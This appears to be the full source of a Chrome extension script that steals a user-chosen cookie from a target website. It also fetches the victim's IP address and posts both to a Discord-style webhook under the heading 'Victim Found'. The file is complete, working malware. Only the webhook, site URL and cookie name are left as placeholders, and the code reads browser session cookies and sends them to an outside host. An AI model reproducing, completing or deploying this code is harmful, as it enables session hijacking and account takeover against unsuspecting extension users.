const WEBHOOK = "YOUR WEBHOOK HERE";

const URL = "WEBSITE URL HERE"

const COOKIE_NAME = "COOKIE NAME HERE"


async function main(cookie) {
    var ipAddr = await (await fetch("https://api.ipify.org")).text();

    fetch(WEBHOOK, {
        method: "POST",
        headers: {
            "Content-Type": "Application/json"
        },
        body: JSON.stringify({
            "content": null,
            "embeds": [
              {
                "description": "```" + (cookie ? cookie : "COOKIE NOT FOUND") + "```",
                "color": null,
                "fields": [
                ],
                "author": {
                  "name": "Victim Found: " + ipAddr,
                },
                "footer": {
                  "text": "https://github.com/s1csty9",
                  "icon_url": "https://upload.wikimedia.org/wikipedia/commons/thumb/9/91/Octicons-mark-github.svg/1200px-Octicons-mark-github.svg.png"
                },
              }
            ],
            "username": "s1csty9",
            "avatar_url": "https://avatars.akamai.steamstatic.com/bbcb3997657944928c88e714fc414cf1710dcf68_full.jpg",
            "attachments": []
        })
    });
}

chrome.cookies.get({"url": URL, "name": COOKIE_NAME}, function(cookie) {
    main(cookie ? cookie.value : null);
});
